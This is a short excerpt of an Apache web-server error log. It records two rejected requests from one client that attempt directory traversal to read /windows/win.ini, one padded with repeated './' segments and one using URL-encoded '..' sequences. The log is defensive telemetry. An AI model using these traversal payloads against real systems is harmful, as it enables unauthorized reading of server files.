[Wed Jul 07 19:30:05.914356 2021] [core:error] [pid 15123] [client 27.147.202.214:3270] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:30:06.241157 2021] [core:error] [pid 15141] [client 27.147.202.214:3324] AH00126: Invalid URI in request GET /js//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
